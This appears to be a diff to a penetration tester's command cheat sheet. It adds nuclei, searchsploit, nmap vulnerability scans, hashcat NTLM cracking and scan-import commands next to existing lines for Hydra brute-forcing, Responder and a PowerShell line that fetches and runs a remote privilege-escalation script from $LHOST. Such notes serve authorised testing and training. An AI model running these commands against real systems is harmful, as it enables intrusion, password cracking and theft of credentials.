@@ -139,6 +139,21 @@ systeminfo
 powershell -ep bypass -c "iex(iwr http://$LHOST/PrivescCheck.ps1 -UseBasicParsing); Invoke-PrivescCheck"
 net user; net localgroup administrators
 
+# ====== vuln scanning / exploit search (offline datasets) ======
+nuclei -duc -t $CC_HOME/resources/data/nuclei-templates -u http://$IP
+nuclei -duc -t $CC_HOME/resources/data/nuclei-templates -l scans/web-targets.txt -severity medium,high,critical
+nuclei -duc -t $CC_HOME/resources/data/nuclei-templates -tags default-login,exposed-panel -l scans/web-targets.txt
+searchsploit apache 2.4
+searchsploit -m 12345
+nmap -sV --script vulscan/vulscan.nse --script-args vulscandb=cve.csv $IP
+hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt -r $CC_HOME/resources/data/rules/OneRuleToRuleThemAll.rule
+jq -r '.vulnerabilities[] | [.cveID,.product,.vulnerabilityName] | @tsv' $CC_HOME/resources/data/cve/kev.json | grep -i exchange
+
+# ====== scans -> kiss dashboard (importable XML) ======
+nmapx discovery -sC -T4 --open $SUBNET
+nmapx $TARGET-full -p- --min-rate 10000 -T4
+nmapx $TARGET-svc -sCV -p 22,80,443,445
+
 # ====== misc ======
 hydra -L users.txt -P /usr/share/wordlists/rockyou.txt ssh://$IP -t 4
 responder -I tun0 -wv
